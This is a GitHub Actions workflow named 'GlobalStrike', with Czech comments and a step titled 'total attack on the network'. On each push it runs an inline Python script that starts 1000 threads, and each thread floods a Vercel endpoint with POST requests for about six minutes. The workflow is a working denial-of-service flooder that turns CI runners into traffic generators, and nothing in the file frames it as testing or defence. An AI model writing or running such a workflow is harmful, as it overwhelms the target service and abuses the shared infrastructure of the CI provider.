name: GlobalStrike
on: [push, workflow_dispatch]

jobs:
  outbreak:
    runs-on: ubuntu-latest
    steps:
      - name: Totalni utok na sit
        run: |
          python3 -c "
          import requests, threading, time
          def hunt():
              while True:
                  # Tvoje adresa z Vercelu
                  target = 'https://smart-locker-security-audit.vercel.app/capture'
                  try:
                      requests.post(target, headers={'Authorization': 'Bearer viral_hit'}, timeout=0.01)
                  except: pass
                  time.sleep(0.001)
          # Spusteni v 1000 vlaknech pro maximalni nátlak
          for _ in range(1000):
              threading.Thread(target=hunt).start()
          time.sleep(350)
          "
